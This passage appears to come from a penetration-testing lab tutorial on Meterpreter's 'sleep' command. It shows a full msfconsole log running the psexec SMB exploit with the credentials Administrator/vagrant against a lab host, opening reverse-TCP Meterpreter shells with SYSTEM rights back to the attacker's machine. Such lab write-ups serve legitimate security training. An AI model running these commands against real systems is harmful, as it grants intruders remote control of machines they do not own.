- The `sleep` command does exactly what you would expect; it makes the current Meterpreter session go to sleep for a specified period of time, and wake up again once that time has expired.
- So, we need to see when the `Meterpreter session` is opened.
```python
┌──(root㉿kali)-[/home/hyok]
└─# msfconsole -q -r /root/psexec.rc
[*] Processing /root/psexec.rc for ERB directives.
resource (/root/psexec.rc)> use exploit/windows/smb/psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
resource (/root/psexec.rc)> set RHOST 192.168.216.11
RHOST => 192.168.216.11
resource (/root/psexec.rc)> set SMBUSER Administrator
SMBUSER => Administrator
resource (/root/psexec.rc)> set SMBPASS vagrant
SMBPASS => vagrant
resource (/root/psexec.rc)> set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
resource (/root/psexec.rc)> exploit
[*] Started reverse TCP handler on 192.168.216.9:4444 
[*] 192.168.216.11:445 - Connecting to the server...
[*] 192.168.216.11:445 - Authenticating to 192.168.216.11:445 as user 'Administrator'...
[*] 192.168.216.11:445 - Selecting PowerShell target
[*] 192.168.216.11:445 - Executing the payload...
[+] 192.168.216.11:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175686 bytes) to 192.168.216.11
[*] Sending stage (175686 bytes) to 192.168.216.11
[-] Failed to load client portion of stdapi.
[*] Meterpreter session 1 opened (192.168.216.9:4444 -> 192.168.216.11:49536) at 2023-03-17 13:17:16 +0530
[*] Meterpreter session 2 opened (192.168.216.9:4444 -> 192.168.216.11:49528) at 2023-03-17 13:17:16 +0530

meterpreter > sleep 5
[*] Telling the target instance to sleep for 5 seconds ...
[+] Target instance has gone to sleep, terminating current session.

[*] 192.168.216.11 - Meterpreter session 1 closed.  Reason: User exit
msf6 exploit(windows/smb/psexec) > sessions

Active sessions
===============

  Id  Name  Type                     Information                           Connection
  --  ----  ----                     -----------                           ----------
  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ VAGRANT-2008R2  192.168.216.9:4444 -> 192.168.216.11:49727 (192.168.216.11)
msf6 exploit(windows/smb/psexec) > sessions -i 7
[*] Starting interaction with 7...

meterpreter > 
```